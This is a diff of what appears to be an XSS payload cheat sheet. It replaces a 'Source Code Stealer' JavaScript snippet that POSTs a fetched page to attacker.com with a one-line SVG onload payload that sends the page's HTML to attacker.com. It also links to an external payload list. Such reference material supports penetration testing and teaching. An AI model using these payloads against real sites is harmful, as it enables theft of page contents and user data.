@@ -199,17 +199,8 @@ Array.from(document.getElementsByTagName("a")).forEach(function(i) {
 });
 ```
 ##### Source Code Stealer
-```javascript
-var request = new XMLHttpRequest();
-request.open("GET", url, true);
-request.send();
-request.onreadystatechange = function() {
-    if (request.readyState == 4)
-	      response = request.responseText;
-	      var dump = new XMLHttpRequest();
-	      dump.open("POST", "attacker.com/dump.php", true)
-	      dump.send(response);
-}
+```html
+<svg/onload="(new Image()).src='//attacker.com/'%2Bdocument.documentElement.innerHTML">
 ```
 A good compilation of advanced XSS exploits can be found [here](http://www.xss-payloads.com/payloads-list.html?a#category=all)
 
